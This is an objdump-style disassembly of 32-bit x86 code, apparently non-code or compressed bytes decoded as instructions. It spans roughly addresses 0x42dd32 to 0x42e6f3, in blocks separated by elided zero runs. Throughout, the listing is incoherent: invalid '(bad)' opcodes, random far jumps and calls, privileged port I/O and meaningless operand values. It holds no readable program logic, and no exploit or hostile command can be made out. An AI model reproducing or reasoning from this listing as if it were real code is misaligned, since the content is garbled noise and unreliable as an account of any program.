  42dd32:	add    BYTE PTR [eax],al
  42dd34:	sbb    DWORD PTR [ecx-0x20017802],esp
  42dd3a:	jns    0x42dcfb
  42dd3c:	daa    
  42dd3d:	data16 fnstsw WORD PTR [ecx-0x5be9432d]
  42dd44:	push   ds
  42dd45:	in     al,0x1
  42dd47:	add    ch,dh
  42dd49:	add    BYTE PTR [eax],al
  42dd4b:	add    BYTE PTR [edx-0x59],cl
  42dd4e:	scas   eax,DWORD PTR es:[edi]
  42dd4f:	or     BYTE PTR [edi+edx*1],cl
  42dd52:	push   esp
  42dd53:	js     0x42dd70
  42dd55:	push   esp
  42dd56:	push   edx
  42dd57:	in     eax,dx
  42dd58:	add    cl,dl
  42dd5a:	sbb    eax,0xcf6acac2
  42dd5f:	pop    edx
  42dd60:	or     ebp,ebp
  42dd62:	cmp    eax,0x93d00206
  42dd67:	mov    al,0xbe
  42dd69:	scas   eax,DWORD PTR es:[edi]
  42dd6a:	leave  
  42dd6b:	jne    0x42dd1e
  42dd6d:	nop
  42dd6e:	dec    esp
  42dd6f:	bnd jbe 0x42dded
  42dd72:	lea    esi,[esi-0x2a]
  42dd75:	mov    ebx,0x5f819dd1
  42dd7a:	shl    esi,1
  42dd7c:	xchg   ebx,eax
  42dd7d:	sub    eax,DWORD PTR [esi+0x32]
  42dd80:	enter  0xed4e,0xa4
  42dd84:	mov    ch,0x8c
  42dd86:	daa    
  42dd87:	imul   edi,eax,0xdfdc7007
  42dd8d:	or     BYTE PTR [edi-0x7bbfcee5],al
  42dd93:	jg     0x42de0c
  42dd95:	pushf  
  42dd96:	jbe    0x42dd75
  42dd98:	jg     0x42ddfe
  42dd9a:	iret   
  42dd9b:	mov    al,BYTE PTR [esi]
  42dd9d:	add    al,0xd4
  42dd9f:	ins    BYTE PTR es:[edi],dx
  42dda0:	cmc    
  42dda1:	aaa    
  42dda2:	lods   eax,DWORD PTR ds:[esi]
  42dda3:	out    dx,eax
  42dda4:	iret   
  42dda5:	push   esp
  42dda6:	jne    0x42ddf2
  42dda8:	mov    dh,0x86
  42ddaa:	das    
  42ddab:	enter  0xf447,0x78
  42ddaf:	data16 int 0x6e
  42ddb2:	mov    esi,0xa87674ff
  42ddb7:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42ddb9:	ins    BYTE PTR es:[edi],dx
  42ddba:	mov    eax,ds:0x89259cfb
  42ddbf:	pusha  
  42ddc0:	fnstcw WORD PTR gs:[edi+0x16109124]
  42ddc7:	mov    al,ds:0x8a281f27
  42ddcc:	call   0x30648074
  42ddd1:	dec    edx
  42ddd2:	test   BYTE PTR [eax+0x5852ad42],bh
  42ddd8:	inc    ebx
  42ddd9:	out    dx,eax
  42ddda:	xor    DWORD PTR [ebp-0x70],ebp
  42dddd:	inc    ecx
  42ddde:	push   edx
  42dddf:	repz xchg ebp,eax
  42dde1:	das    
  42dde2:	scas   eax,DWORD PTR es:[edi]
  42dde3:	cdq    
  42dde4:	sub    bh,dl
  42dde6:	mov    BYTE PTR [edi-0x6d],bh
  42dde9:	(bad)  
  42ddea:	jg     0x42de24
  42ddec:	jne    0x42dd7c
  42ddee:	sahf   
  42ddef:	in     eax,dx
  42ddf0:	or     BYTE PTR [eax],0x6e
  42ddf3:	or     BYTE PTR [edx],al
  42ddf5:	xor    BYTE PTR [eax-0x10],cl
  42ddf8:	shl    BYTE PTR [eax+edx*2],0x3b
  42ddfc:	(bad)
  42de01:	sbb    DWORD PTR [esi+0xa702c68],edi
  42de07:	lahf   
  42de08:	data16 fxam 
  42de0b:	outs   dx,DWORD PTR ds:[esi]
  42de0c:	in     eax,dx
  42de0d:	jae    0x42de56
  42de0f:	pop    ecx
  42de10:	jg     0x42ddd1
  42de12:	push   es
  42de13:	inc    esp
  42de14:	xchg   ecx,eax
  42de15:	call   0x3bba:0xf39eedfa
  42de1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de1d:	in     eax,dx
  42de1e:	pop    ss
  42de1f:	mov    DWORD PTR [edi-0x75b514f8],edx
  42de25:	fistp  DWORD PTR [ebp-0x3b625927]
  42de2b:	push   ecx
  42de2c:	(bad)  
  42de2d:	or     al,0xf9
  42de2f:	int3   
  42de30:	xchg   ebx,eax
  42de31:	inc    esp
  42de32:	int3   
  42de33:	aam    0x88
  42de35:	(bad)  
  42de36:	popa   
  42de37:	in     al,0xfd
  42de39:	xor    al,0x42
  42de3b:	push   ebp
  42de3c:	cld    
  42de3d:	push   eax
  42de3e:	inc    eax
  42de3f:	rcl    BYTE PTR [ebp+0x0],0x0
	...
  42deb3:	add    BYTE PTR [ebx+0x3d],dh
  42deb6:	fadd   st,st(1)
  42deb8:	fsubrp st(5),st
  42deba:	jnp    0x42de7b
  42debc:	push   ds
  42debd:	xor    edi,DWORD PTR [esi+0x4987380c]
  42dec3:	and    DWORD PTR [ebx],edx
  42dec5:	in     eax,0x1
  42dec7:	add    ch,dh
  42dec9:	add    BYTE PTR [eax],al
  42decb:	add    BYTE PTR [ebx+0x67b9fc65],ch
  42ded1:	inc    edx
  42ded2:	icebp  
  42ded3:	mov    al,0x2e
  42ded5:	jecxz  0x42de76
  42ded7:	or     ah,dh
  42ded9:	and    DWORD PTR [ebp+ecx*2+0x3107475d],esi
  42dee0:	push   ecx
  42dee1:	pop    edx
  42dee2:	lods   al,BYTE PTR ds:[esi]
  42dee3:	es sbb al,0xba
  42dee6:	sbb    al,0x16
  42dee8:	clc    
  42dee9:	jnp    0x42df23
  42deeb:	push   esp
  42deec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42deed:	std    
  42deee:	mov    ch,0x6d
  42def0:	outs   dx,DWORD PTR ds:[esi]
  42def1:	bound  esp,QWORD PTR [edx]
  42def3:	push   ss
  42def4:	mov    al,ss:0xa7fc3104
  42defa:	mov    bh,0x37
  42defc:	cmp    bl,BYTE PTR [eax-0x305d1539]
  42df02:	sbb    BYTE PTR [edx],cl
  42df04:	adc    bl,BYTE PTR [ecx-0x705a75ec]
  42df0a:	inc    esi
  42df0b:	(bad)  
  42df0c:	outs   dx,BYTE PTR ds:[esi]
  42df0d:	xchg   esp,esp
  42df0f:	wrmsr  
  42df11:	fsubr  DWORD PTR [esi]
  42df13:	add    eax,0x4fa9844e
  42df18:	mov    al,ds:0x1bc291e3
  42df1d:	mov    bl,0x1e
  42df1f:	popf   
  42df20:	sub    eax,0x6e5bc211
  42df25:	shl    BYTE PTR [edi-0x50],1
  42df28:	cmp    al,0x90
  42df2a:	ret    0xe04
  42df2d:	loope  0x42df3a
  42df2f:	ror    BYTE PTR [edx+0x6e],cl
  42df32:	sbb    al,0xfc
  42df34:	call   0x5e6e74be
  42df39:	cmp    DWORD PTR [ebp+0x67],eax
  42df3c:	lods   eax,DWORD PTR ds:[esi]
  42df3d:	or     BYTE PTR [edx-0x31915359],0x2e
  42df44:	cli    
  42df45:	rcl    esp,0xf4
  42df48:	(bad)  
  42df49:	fisub  WORD PTR [edi-0x74]
  42df4c:	inc    ebx
  42df4d:	jae    0x42df61
  42df4f:	mov    eax,ds:0x75e88b9c
  42df54:	xor    esp,DWORD PTR [eax]
  42df56:	mov    esp,0xf3fafdc2
  42df5b:	sbb    edi,DWORD PTR [ebp-0x4ebca07f]
  42df61:	into   
  42df62:	sub    BYTE PTR [eax+0x4f11d5ad],bh
  42df68:	mov    ss,WORD PTR [ebx+0x52]
  42df6b:	xchg   edx,eax
  42df6c:	(bad)  
  42df6d:	fst    DWORD PTR [ebx+0x33]
  42df70:	out    0xe6,eax
  42df72:	push   ecx
  42df73:	and    eax,0xf45c13d5
  42df78:	in     al,dx
  42df79:	push   ss
  42df7a:	ja     0x42dfa3
  42df7c:	retf   
  42df7d:	test   eax,0x149f2b9
  42df82:	repz jae 0x42df77
  42df85:	cmp    BYTE PTR [esi+eax*4+0x64857c60],ch
  42df8c:	fucomip st,st(2)
  42df8e:	popf   
  42df8f:	cli    
  42df90:	dec    ecx
  42df91:	scas   eax,DWORD PTR es:[edi]
  42df92:	pop    edi
  42df93:	cld    
  42df94:	cmp    bl,al
  42df96:	mov    bl,0x4f
  42df98:	fisub  DWORD PTR ds:0x9c5a5b1e
  42df9e:	or     cl,ch
  42dfa0:	mov    bl,0xc8
  42dfa2:	sbb    eax,0x97d03f45
  42dfa7:	clc    
  42dfa8:	adc    eax,0xf4c0f01a
  42dfad:	leave  
  42dfae:	icebp  
  42dfaf:	xor    BYTE PTR [ebx-0x4b8ec142],bl
  42dfb5:	jb     0x42e02d
  42dfb7:	mov    DWORD PTR [ecx+0x62c33e4],eax
  42dfbd:	ins    BYTE PTR es:[edi],dx
  42dfbe:	or     ecx,0x44
	...
  42e031:	add    BYTE PTR [eax],al
  42e033:	add    BYTE PTR [eax+0x3a],dl
  42e036:	(bad)  
  42e037:	sub    al,0xee
  42e039:	cld    
  42e03a:	cli    
  42e03b:	jle    0x42e08c
  42e03d:	add    BYTE PTR [ebx+0x25cad2e2],0x9c
  42e044:	or     dh,ah
  42e046:	add    DWORD PTR [eax],eax
  42e048:	cmc    
  42e049:	add    BYTE PTR [eax],al
  42e04b:	add    BYTE PTR [ecx+0x45c79028],dl
  42e051:	iret   
  42e052:	cmp    DWORD PTR [edx],ebx
  42e054:	mov    edi,0x207c4643
  42e059:	icebp  
  42e05a:	scas   al,BYTE PTR es:[edi]
  42e05b:	out    dx,eax
  42e05c:	jp     0x42e04e
  42e05e:	jg     0x42dff7
  42e060:	daa    
  42e061:	jnp    0x42e0e2
  42e063:	ins    DWORD PTR es:[edi],dx
  42e064:	inc    edi
  42e065:	push   ebx
  42e066:	mov    BYTE PTR [ecx],al
  42e068:	mov    bl,0xc8
  42e06a:	lods   eax,DWORD PTR ds:[esi]
  42e06b:	(bad)  
  42e06c:	popf   
  42e06d:	cmp    al,0x12
  42e06f:	shr    cl,0xdd
  42e072:	or     al,0xf8
  42e074:	(bad)  
  42e075:	xor    dl,BYTE PTR [ecx+ebp*8]
  42e078:	pop    ss
  42e079:	cvtdq2ps xmm5,XMMWORD PTR [eax+0x1e]
  42e07d:	push   esp
  42e07e:	sub    cl,cl
  42e080:	mov    esp,0xda81af8a
  42e085:	xchg   ecx,eax
  42e086:	or     ebx,DWORD PTR [ecx]
  42e088:	mov    al,ds:0x34f3686f
  42e08d:	dec    edi
  42e08e:	(bad)  
  42e08f:	push   edx
  42e090:	popf   
  42e091:	add    eax,0xa6f48e43
  42e096:	dec    edx
  42e097:	retf   0xf936
  42e09a:	mov    eax,0xc910939
  42e09f:	jmp    0xc050:0x5c74a765
  42e0a6:	sbb    al,0x16
  42e0a8:	addr16 cs (bad) 
  42e0ab:	sbb    BYTE PTR [ebx],bh
  42e0ad:	cmp    BYTE PTR ds:0xf027f389,al
  42e0b3:	ins    DWORD PTR es:[edi],dx
  42e0b4:	mov    dh,0x99
  42e0b6:	lea    ebx,[ebx]
  42e0b8:	bound  ecx,QWORD PTR [edi+0x11]
  42e0bb:	push   ebx
  42e0bc:	xor    DWORD PTR [eax-0x5d],ebx
  42e0bf:	mov    es,WORD PTR ds:0x94329aa6
  42e0c5:	cli    
  42e0c6:	rcr    esp,cl
  42e0c8:	or     BYTE PTR [ecx],ah
  42e0ca:	call   0xce5a364c
  42e0cf:	fdivr  QWORD PTR ds:0x55f36782
  42e0d5:	aaa    
  42e0d6:	(bad)  [edi-0x1c]
  42e0d9:	out    dx,eax
  42e0da:	rcl    BYTE PTR [ebx],1
  42e0dc:	js     0x42e15d
  42e0de:	cmp    cl,dh
  42e0e0:	je     0x42e153
  42e0e2:	inc    ebp
  42e0e3:	pushf  
  42e0e4:	ds add esi,esi
  42e0e7:	xor    ecx,DWORD PTR [esi]
  42e0e9:	xor    DWORD PTR [edi+0x60],ebx
  42e0ec:	adc    al,0x5
  42e0ee:	ss jmp 0xe074:0x74c91fa1
  42e0f6:	(bad)  
  42e0f7:	mov    eax,ds:0x6d2747e5
  42e0fc:	lock icebp 
  42e0fe:	mov    esi,DWORD PTR [edi]
  42e100:	(bad)  
  42e101:	jle    0x42e09e
  42e103:	push   ebp
  42e104:	push   edx
  42e105:	sbb    esi,DWORD PTR [ebp+0x79]
  42e108:	idiv   BYTE PTR [ebx]
  42e10a:	jp     0x42e091
  42e10c:	fs push 0xffffffac
  42e10f:	or     eax,DWORD PTR [ecx+ebp*4+0x783ed1f4]
  42e116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e117:	xor    BYTE PTR [eax],ah
  42e119:	sbb    ebp,esi
  42e11b:	in     al,dx
  42e11c:	lock jmp 0x212e91e1
  42e122:	xor    DWORD PTR [esi-0x5344c13],0x16
  42e129:	test   esi,ebp
  42e12b:	jmp    0x42e18e
  42e12d:	out    dx,al
  42e12e:	inc    esp
  42e12f:	mov    esp,0xe6251141
  42e134:	(bad)  
  42e136:	mov    eax,ds:0x737591e4
  42e13b:	and    al,0x5f
  42e13d:	in     eax,0xbd
  42e13f:	imul   ebx,DWORD PTR [ebx+0x0],0x0
	...
  42e1b3:	add    BYTE PTR [ebp-0x2289a2f8],cl
  42e1b9:	ja     0x42e16a
  42e1bb:	sti    
  42e1bc:	dec    esi
  42e1bd:	push   edx
  42e1be:	sbb    eax,0x277ba771
  42e1c3:	scas   al,BYTE PTR es:[edi]
  42e1c4:	std    
  42e1c5:	out    0x1,al
  42e1c7:	add    ch,dh
  42e1c9:	add    BYTE PTR [eax],al
  42e1cb:	add    ah,bh
  42e1cd:	pop    ss
  42e1ce:	and    eax,DWORD PTR [ebp+0x76d37562]
  42e1d4:	xchg   ebp,eax
  42e1d5:	sbb    al,0xe4
  42e1d7:	fsubr  DWORD PTR [ecx-0x42d1be74]
  42e1dd:	in     eax,dx
  42e1de:	or     bl,BYTE PTR [esi+0x628c0cb3]
  42e1e4:	add    dl,BYTE PTR [ebx-0x3d]
  42e1e7:	fcom   QWORD PTR [esi]
  42e1e9:	sbb    ebp,ebx
  42e1eb:	push   esi
  42e1ec:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e1ee:	(bad)  
  42e1ef:	lds    eax,FWORD PTR [edx+ebx*2+0x6cc74d49]
  42e1f6:	(bad)  
  42e1f7:	into   
  42e1f8:	cmp    ebx,esp
  42e1fa:	sub    BYTE PTR [edi-0x56f0a5e6],0x7e
  42e201:	test   DWORD PTR [ecx+0x14],0xafe3e8f6
  42e208:	into   
  42e209:	pop    edx
  42e20a:	jnp    0x42e24f
  42e20c:	mov    edx,ebp
  42e20e:	cdq    
  42e20f:	push   eax
  42e210:	leave  
  42e211:	cmp    bl,BYTE PTR [edx-0x3b]
  42e214:	sbb    eax,0x2f4ac121
  42e219:	mov    ah,0xb4
  42e21b:	lds    ebx,FWORD PTR [eax-0x5f8ff567]
  42e221:	mov    BYTE PTR [edi-0x7ae5a3f9],dl
  42e227:	xor    DWORD PTR [eax+0x51],ebx
  42e22a:	in     al,dx
  42e22b:	xchg   ecx,eax
  42e22c:	inc    ebx
  42e22d:	pfsubr mm1,QWORD PTR [eax-0x1f2fbfa9]
  42e235:	adc    BYTE PTR [ebx],ch
  42e237:	dec    edi
  42e238:	lds    ecx,FWORD PTR [ebp+0x5b]
  42e23b:	cmp    eax,0x8c8fb451
  42e241:	pop    esp
  42e242:	pop    ecx
  42e243:	jb     0x295ba6f7
  42e249:	call   0xd1bb:0x70a7fd95
  42e250:	loop   0x42e261
  42e252:	mul    bh
  42e254:	lods   al,BYTE PTR ds:[esi]
  42e255:	cmp    BYTE PTR [edx-0x35],bh
  42e258:	pop    ebx
  42e259:	icebp  
  42e25a:	mov    ah,0xa2
  42e25c:	xchg   ebx,eax
  42e25d:	mov    al,0x6c
  42e25f:	or     al,0xb3
  42e261:	pop    ebp
  42e262:	mov    esp,0x427ae551
  42e267:	nop
  42e268:	fcomip st,st(1)
  42e26a:	mov    ecx,ebp
  42e26c:	inc    esp
  42e26d:	addr16 sti 
  42e26f:	push   ebx
  42e270:	xchg   edx,eax
  42e271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e272:	loope  0x42e293
  42e274:	jge    0x42e23c
  42e276:	push   esp
  42e277:	jle    0x42e23a
  42e279:	adc    edx,DWORD PTR [ebp-0x80]
  42e27c:	loopne 0x42e21f
  42e27e:	push   esp
  42e27f:	push   ds
  42e280:	in     al,0x6f
  42e282:	stc    
  42e283:	stos   BYTE PTR es:[edi],al
  42e284:	push   edx
  42e285:	jmp    0x20569d4
  42e28a:	xchg   ebp,eax
  42e28b:	jl     0x42e28d
  42e28d:	mov    ah,BYTE PTR [eax+0x2b]
  42e290:	sbb    BYTE PTR [esi-0x72],cl
  42e293:	mov    al,ds:0x4b943bfa
  42e298:	retf   
  42e299:	leave  
  42e29a:	lea    ebx,[ebp-0x63eefc39]
  42e2a0:	popf   
  42e2a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e2a2:	xchg   edx,eax
  42e2a3:	inc    eax
  42e2a4:	inc    ebp
  42e2a5:	jns    0x42e2c4
  42e2a7:	aaa    
  42e2a8:	adc    BYTE PTR [esi],ch
  42e2aa:	xor    edi,DWORD PTR [eax+edx*4]
  42e2ad:	inc    edi
  42e2ae:	lods   eax,DWORD PTR ds:[esi]
  42e2af:	std    
  42e2b0:	mov    ebx,0x69a34e72
  42e2b5:	cmp    esi,ebx
  42e2b7:	mov    edx,0xfd894e9f
  42e2bc:	retf   0x3b69
  42e2bf:	jp     0x42e314
	...
  42e331:	add    BYTE PTR [eax],al
  42e333:	add    cl,al
  42e335:	into   
  42e336:	arpl   WORD PTR [ecx-0x21044291],bx
  42e33c:	inc    esi
  42e33d:	push   ecx
  42e33e:	cmc    
  42e33f:	or     DWORD PTR [esi-0xd6e2ce3],edx
  42e345:	out    0x1,eax
  42e347:	add    ch,dh
  42e349:	add    BYTE PTR [eax],al
  42e34b:	add    bl,bl
  42e34d:	add    DWORD PTR [ecx],ebp
  42e34f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e350:	pop    ebp
  42e351:	dec    ecx
  42e352:	out    0x85,al
  42e354:	add    cl,BYTE PTR [ebp+0x6e]
  42e357:	adc    eax,0x97d0fa16
  42e35c:	mov    bl,0x9e
  42e35e:	inc    ebx
  42e35f:	or     DWORD PTR [ecx],esp
  42e361:	cmc    
  42e362:	cs (bad) 
  42e364:	cdq    
  42e365:	xchg   edx,eax
  42e366:	inc    edi
  42e367:	cmp    al,0xe2
  42e369:	jge    0x42e2f4
  42e36b:	sub    DWORD PTR ds:0x28c279f1,0x6a
  42e372:	in     eax,0x54
  42e374:	adc    BYTE PTR [eax],0x2d
  42e377:	inc    edi
  42e378:	fbstp  TBYTE PTR [edx]
  42e37a:	inc    eax
  42e37b:	pop    esi
  42e37c:	lods   al,BYTE PTR ds:[esi]
  42e37d:	adc    cl,ah
  42e37f:	mov    bl,0xc0
  42e381:	leave  
  42e382:	jb     0x42e335
  42e384:	xor    BYTE PTR [esi],bh
  42e386:	out    0x36,eax
  42e388:	inc    ecx
  42e389:	and    BYTE PTR [ebp-0x69],bl
  42e38c:	dec    edx
  42e38d:	xor    eax,0xad95d69c
  42e392:	sbb    DWORD PTR gs:[eax+eax*1-0x12],ebx
  42e397:	js     0x42e3d9
  42e399:	int    0xac
  42e39b:	xor    eax,0xf8373c9d
  42e3a0:	add    bh,BYTE PTR [edi+eiz*2-0x5c]
  42e3a4:	test   DWORD PTR [esi+0x27],esi
  42e3a7:	push   0x3a5f7b8f
  42e3ac:	dec    ecx
  42e3ad:	and    eax,0x9c1dc6c1
  42e3b2:	push   esp
  42e3b3:	lods   al,BYTE PTR ds:[esi]
  42e3b4:	popf   
  42e3b5:	loopne 0x42e403
  42e3b7:	(bad)  
  42e3b8:	adc    BYTE PTR [edi+0x771e049],bh
  42e3be:	jo     0x42e3e2
  42e3c0:	xor    DWORD PTR [ebp-0xb],edx
  42e3c3:	sub    BYTE PTR [ecx+0x78cae129],0xc9
  42e3ca:	or     eax,0xa779cf8
  42e3cf:	mov    dh,0xe
  42e3d1:	jae    0x42e40b
  42e3d3:	sub    DWORD PTR [edi],esi
  42e3d5:	xor    BYTE PTR [ebp+ebx*1-0x46],0xf3
  42e3da:	adc    al,0xd0
  42e3dc:	mov    ds:0xf31d0632,eax
  42e3e1:	sub    ebx,DWORD PTR [ebx]
  42e3e3:	sub    eax,0x11f0915d
  42e3e8:	das    
  42e3e9:	mov    cl,0xd1
  42e3eb:	sbb    eax,DWORD PTR [ecx+0x12c81f6c]
  42e3f1:	inc    edi
  42e3f2:	pushf  
  42e3f3:	cmp    BYTE PTR [edx+0x276b9fff],ch
  42e3f9:	ins    DWORD PTR es:[edi],dx
  42e3fa:	xchg   esp,eax
  42e3fb:	mov    ah,0xf6
  42e3fd:	dec    esp
  42e3fe:	push   ds
  42e3ff:	scas   al,BYTE PTR es:[edi]
  42e400:	or     al,0x59
  42e402:	repz ss xchg edi,eax
  42e405:	test   DWORD PTR [edx+ebp*1-0x50],ebp
  42e409:	add    ebp,DWORD PTR [edx]
  42e40b:	jb     0x42e467
  42e40d:	stc    
  42e40e:	in     al,dx
  42e40f:	scas   al,BYTE PTR es:[edi]
  42e410:	xchg   esi,eax
  42e411:	shl    DWORD PTR [ecx+0x4c7f535a],0xa4
  42e418:	sbb    al,0x70
  42e41a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e41b:	fisttp DWORD PTR [edi-0x178a7fe0]
  42e421:	pop    ss
  42e422:	cld    
  42e423:	cmp    eax,0xe211d327
  42e428:	popf   
  42e429:	mov    bl,0xf1
  42e42b:	inc    ecx
  42e42c:	(bad)  
  42e42e:	mov    ebx,0xd6a386df
  42e433:	and    al,0x99
  42e435:	pusha  
  42e436:	ret    0x663d
  42e439:	nop
  42e43a:	jnp    0x42e428
  42e43c:	mov    dh,0xba
  42e43e:	pop    eax
  42e43f:	mov    dl,0xce
	...
  42e4b1:	add    BYTE PTR [eax],al
  42e4b3:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42e4b9:	ja     0x42e494
  42e4bb:	dec    DWORD PTR [edi]
  42e4bd:	jecxz  0x42e4a2
  42e4bf:	mov    esp,0x5a97ded5
  42e4c4:	out    0xe8,eax
  42e4c6:	add    DWORD PTR [eax],eax
  42e4c8:	cmc    
  42e4c9:	add    BYTE PTR [eax],al
  42e4cb:	add    BYTE PTR [ebp+ebp*4+0x42],cl
  42e4cf:	dec    ebp
  42e4d0:	js     0x42e487
  42e4d2:	pop    ebp
  42e4d3:	cmp    al,0x81
  42e4d5:	pop    ebp
  42e4d6:	das    
  42e4d7:	pop    ebx
  42e4d8:	(bad)  
  42e4da:	cs cs xor esp,esi
  42e4de:	inc    ecx
  42e4df:	out    dx,eax
  42e4e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e4e1:	dec    eax
  42e4e2:	cdq    
  42e4e3:	pushf  
  42e4e4:	jno    0x42e556
  42e4e6:	(bad)  
  42e4e7:	sar    BYTE PTR [ebp+0x7fe38a56],1
  42e4ed:	enter  0x6c1c,0x41
  42e4f1:	inc    edi
  42e4f2:	gs es pop edx
  42e4f5:	and    eax,0x7c4c747b
  42e4fa:	cmp    ebp,0x95849dec
  42e500:	outs   dx,BYTE PTR ds:[esi]
  42e501:	mov    ch,0x1d
  42e503:	inc    edx
  42e504:	mov    esp,0xad64d196
  42e509:	mov    ah,0x4d
  42e50b:	mov    eax,0xfe0003a3
  42e510:	aas    
  42e511:	push   eax
  42e512:	aad    0xe5
  42e514:	and    BYTE PTR [eax],cl
  42e516:	out    0x81,eax
  42e518:	out    dx,eax
  42e519:	gs mov cl,0x23
  42e51c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e51d:	mov    ch,0x37
  42e51f:	aad    0x5
  42e521:	retf   0x4a52
  42e524:	enter  0x1bb8,0x83
  42e528:	sub    eax,0x60b4f175
  42e52d:	test   BYTE PTR [eax+edx*4+0x27],dh
  42e531:	mov    al,0x42
  42e533:	pop    edx
  42e534:	mov    dh,0x2e
  42e536:	loopne 0x42e4f7
  42e538:	stc    
  42e539:	mov    dh,0x16
  42e53b:	mov    cl,0x18
  42e53d:	fst    DWORD PTR [edx-0x4146b3cd]
  42e543:	sti    
  42e544:	(bad)  
  42e545:	(bad)  [ebp+0x7]
  42e548:	rol    BYTE PTR [eax],0xe3
  42e54b:	sub    DWORD PTR [esi+0x5e5caf8e],edi
  42e551:	or     ebx,ebx
  42e553:	jns    0x42e5b2
  42e555:	mov    ch,0x8b
  42e557:	(bad)  
  42e558:	sbb    al,0x54
  42e55a:	jbe    0x42e5bf
  42e55c:	pusha  
  42e55d:	dec    ecx
  42e55e:	inc    ebx
  42e55f:	nop
  42e560:	xor    cl,BYTE PTR ds:0xd7075656
  42e566:	shr    BYTE PTR [ecx-0x48],cl
  42e569:	dec    esp
  42e56a:	xchg   edx,eax
  42e56b:	fldcw  WORD PTR [esp+0xe]
  42e56f:	out    0x2e,al
  42e571:	lahf   
  42e572:	push   ecx
  42e573:	repnz popa 
  42e575:	push   ss
  42e576:	mov    al,0x8f
  42e578:	icebp  
  42e579:	push   esp
  42e57a:	fwait
  42e57b:	push   0xbc7fcb84
  42e580:	xchg   ebx,eax
  42e581:	es mov ecx,0xd0b909cd
  42e587:	mov    ds:0x7e4a97b1,al
  42e58c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e58d:	shl    BYTE PTR [esi+0x7c51e47e],0x2d
  42e594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e595:	mov    eax,ds:0xf8cd7e64
  42e59a:	ror    DWORD PTR [ecx-0x6c],0x9b
  42e59e:	dec    edi
  42e59f:	out    0x7f,al
  42e5a1:	add    al,0x19
  42e5a3:	mov    BYTE PTR [esi-0x2493db0b],ch
  42e5a9:	pop    ebp
  42e5aa:	mov    cl,0x69
  42e5ac:	int3   
  42e5ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e5ae:	shl    DWORD PTR [ecx+0x8],1
  42e5b1:	repnz mov edi,0x20773452
  42e5b7:	sub    BYTE PTR [edi-0x1625a37e],bl
  42e5bd:	hlt    
  42e5be:	xor    DWORD PTR [ecx-0x2d],esp
	...
  42e631:	add    BYTE PTR [eax],al
  42e633:	add    bl,dh
  42e635:	add    esp,DWORD PTR [eax]
  42e637:	(bad)  
  42e638:	lock scas eax,DWORD PTR es:[edi]
  42e63a:	(bad)  
  42e63b:	jg     0x42e5e4
  42e63d:	mov    WORD PTR [esi+0x5f],es
  42e640:	inc    esi
  42e641:	add    al,BYTE PTR [ebp-0x72]
  42e644:	fsub   st(1),st
  42e646:	add    DWORD PTR [eax],eax
  42e648:	cmc    
  42e649:	add    BYTE PTR [eax],al
  42e64b:	add    BYTE PTR [ebx+ecx*8-0x68],dh
  42e64f:	mov    dh,0xb3
  42e651:	scas   eax,DWORD PTR es:[edi]
  42e652:	mov    ah,0x63
  42e654:	(bad)  
  42e655:	loop   0x42e668
  42e657:	push   0xb8f054c5
  42e65c:	icebp  
  42e65d:	sti    
  42e65e:	pop    ecx
  42e65f:	(bad)  
  42e660:	jne    0x42e60a
  42e662:	ins    BYTE PTR es:[edi],dx
  42e663:	xor    bh,BYTE PTR [eax+0x74]
  42e666:	jge    0x42e634
  42e668:	popf   
  42e669:	jne    0x42e684
  42e66b:	lock dec edi
  42e66d:	rcl    BYTE PTR [eax+ecx*8+0x1ae2cc44],cl
  42e674:	cs mov ch,0x44
  42e677:	repnz inc ebp
  42e679:	xchg   BYTE PTR [eax+0x13],al
  42e67c:	inc    edi
  42e67d:	push   esp
  42e67e:	cdq    
  42e67f:	mov    eax,0x8e18d8d6
  42e684:	and    eax,0xca140bff
  42e689:	icebp  
  42e68a:	sbb    dh,ah
  42e68c:	sub    DWORD PTR [edx],edi
  42e68e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e68f:	outs   dx,BYTE PTR ds:[esi]
  42e690:	and    al,0x55
  42e692:	inc    ecx
  42e693:	cmc    
  42e694:	std    
  42e695:	into   
  42e696:	adc    esi,ecx
  42e698:	sar    ebp,cl
  42e69a:	call   0x131d1cac
  42e69f:	outs   dx,BYTE PTR ds:[esi]
  42e6a0:	aad    0xf4
  42e6a2:	ins    BYTE PTR es:[edi],dx
  42e6a3:	rcr    DWORD PTR [edx],1
  42e6a5:	iret   
  42e6a6:	pop    edx
  42e6a7:	sbb    ch,BYTE PTR [ecx]
  42e6a9:	mov    bl,0x72
  42e6ab:	pop    esi
  42e6ac:	lea    edx,[edi]
  42e6ae:	jmp    DWORD PTR [ecx]
  42e6b0:	jns    0x42e659
  42e6b2:	sub    DWORD PTR [esi-0xb2a0d82],edx
  42e6b8:	inc    edi
  42e6b9:	push   ebp
  42e6ba:	xor    al,BYTE PTR [esi-0x31]
  42e6bd:	mov    cl,0xb9
  42e6bf:	stos   BYTE PTR es:[edi],al
  42e6c0:	mov    edi,0xd19b4234
  42e6c5:	jle    0x42e68f
  42e6c7:	mov    ds:0x7d340bd9,al
  42e6cc:	xor    eax,0xcf9d1036
  42e6d1:	lds    esp,FWORD PTR [ebp+0x6f293d5a]
  42e6d7:	jmp    0x42e750
  42e6d9:	mov    BYTE PTR [ebx],bl
  42e6db:	in     eax,dx
  42e6dc:	jge    0x42e6be
  42e6de:	jae    0x42e67f
  42e6e0:	jp     0x42e6a0
  42e6e2:	sub    al,0x5
  42e6e4:	push   ebx
  42e6e5:	test   al,0x5f
  42e6e7:	aam    0x6b
  42e6e9:	arpl   bp,di
  42e6eb:	mov    WORD PTR [ecx-0x4bb3f1d1],es
  42e6f1:	jae    0x42e6d2
  42e6f3:	int3   
